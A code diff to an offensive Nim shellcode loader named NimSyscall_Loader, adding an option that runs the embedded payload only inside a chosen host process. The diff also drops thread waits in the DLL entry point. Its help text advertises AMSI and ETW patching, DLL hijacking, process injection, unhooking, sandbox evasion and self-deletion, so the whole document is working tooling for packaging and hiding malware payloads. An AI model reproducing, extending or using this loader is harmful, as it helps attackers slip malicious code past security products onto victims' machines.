@@ -68,7 +68,7 @@ let helpmenu = """
 NimSyscall_Loader v 2.2
 
 Usage:
-  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --keyfile=<keyFile> --dnsKey --dnsdomain=<sub.example.com> --environmentalKey=<domain,username> --killdate=<yyyymmdd> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --perfectdllhijack --noNimMain --clone=<dllToClone> --dllProxy --payloadFunction=<functionName> --noRandom --mutexoneshot --cpl --xll --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --mapSection --unhook=<dllname1,dllname2> --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2> --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --noAntiEmulate --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --csout --scout --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate --dripsleep=<sleeptime-ms> --stegofile=<filepath> --ruy-lopez --threadless --threadlessDll=<dllname.dll> --threadlessFunc=<dllfunc> --threadlessthread --poolparty=<number> --conhostinject --Caro-Kann --Caro-Kann-Thread --stomb --stombDll=<dllname.dll> --stombFunc=<dllfunc> --stombFunc2=<dllfunc2> --restore]
+  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --keyfile=<keyFile> --dnsKey --dnsdomain=<sub.example.com> --environmentalKey=<domain,username> --killdate=<yyyymmdd> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --execute-if=<procname> --dllhijack --perfectdllhijack --noNimMain --clone=<dllToClone> --dllProxy --payloadFunction=<functionName> --noRandom --mutexoneshot --cpl --xll --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --mapSection --unhook=<dllname1,dllname2> --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2> --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --noAntiEmulate --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --csout --scout --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate --dripsleep=<sleeptime-ms> --stegofile=<filepath> --ruy-lopez --threadless --threadlessDll=<dllname.dll> --threadlessFunc=<dllfunc> --threadlessthread --poolparty=<number> --conhostinject --Caro-Kann --Caro-Kann-Thread --stomb --stombDll=<dllname.dll> --stombFunc=<dllfunc> --stombFunc2=<dllfunc2> --restore]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -86,6 +86,7 @@ Options:
   --environmentalKey value    Use environmental key (domain,username) to encrypt with
                               domain -> enumerate the current domain on runtime and use that as key
                               username -> enumerate the current username on runtime and use that as key
+  --execute-if procname    Execute the payload only, if the DLL is loaded from the defined process name. Or for executables if the exectable wasn't renamed.
   --killdate yyyymmdd    Specify an date, after which the payload won't get executed anymore
   --output filename    Filename for encrypted exe/dll
   --arguments hardcodedArgs  compile the following arguments to the encrypted exe/dll
@@ -251,6 +252,8 @@ var
     webKey: bool = false
     dll_out: bool = false
     dllfunc: string = ""
+    execute_in_proc: bool = false
+    execute_in: string = ""
     dllexportfunctions: seq[string]
     dllNames: seq[string]
     unDlls: string = ""
@@ -567,6 +570,12 @@ if args["--dllexportfunc"]:
   let dllfuncstring = args["--dllexportfunc"]
   dllfunc = fmt"{dllfuncstring}"
   dllexportfunctions = dllfunc.split(',')
+
+if args["--execute-if"]:
+  execute_in_proc = true
+  let execin = args["--execute-if"]
+  execute_in = fmt"{execin}"
+
 
 if args["--dllhijack"]:
   dllhijack = true
@@ -3030,6 +3039,21 @@ when not defined(dllexportfuncs):
             return true
 """
 
+let ExecuteInStub = """
+
+proc execute_in(): bool =
+    var temp: array[MAX_PATH, char]
+    var exe_name: string = obf("EXENAME")
+    if GetModuleFileNameA(cast[HMODULE](0), cast[LPSTR](temp.addr), DWORD(temp.len)) > 0:
+        let temp_str = $cast[cstring](temp.addr)
+        if temp_str.contains(exe_name):
+            return false
+    return true
+
+
+"""
+
+
 let PerfectDLLHijackStub = """
 
 import perfecthijack
@@ -3081,10 +3105,8 @@ proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL 
                     lastError = GetLastError()
                     if mutex != 0 and lastError != ERROR_ALREADY_EXISTS:
                         var threadHandle = CreateThread(NULL, 0, main, NULL, 0, NULL)
-                        WaitForSingleObject(threadHandle, INFINITE)
             else:
                 var threadHandle = CreateThread(NULL, 0, main, NULL, 0, NULL)
-                WaitForSingleObject(threadHandle, INFINITE)
   if fdwReason == DLL_THREAD_ATTACH:
     NimMain()
   #if fdwReason == DLL_PROCESS_ATTACH:
@@ -3829,6 +3851,9 @@ when not defined(DInvoke):
         from winim import GetModuleInformation,MODULEINFO,LPMODULEINFO
 
 proc main(lpParameter: LPVOID) : DWORD {.stdcall.} =
+    when defined(execute_in_proc):
+        if execute_in():
+            return 0
 
     when defined(mutexoneshot):
         Sleep(2000)
@@ -4126,6 +4151,10 @@ if(threadless):
 
 if(conhostinject):
     stub.add(conhostinjectenumstubs)
+
+if(execute_in_proc):
+    var tempStub = ExecuteInStub.replace("EXENAME", execute_in)
+    stub.add(tempStub)
 
 if (not mutexoneshot):
     stub.add(MainStub)
@@ -4561,6 +4590,9 @@ elif (retrieveFromURL):
     stub.add(ShellcodefromURLStub)
 else:
     basicCompileFlags.add("-d:PayloadEmbedded ")
+
+if(execute_in_proc):
+    basicCompileFlags.add("-d:execute_in_proc ")
 
 if(customKey):
     basicCompileFlags.add("-d:customKey ")
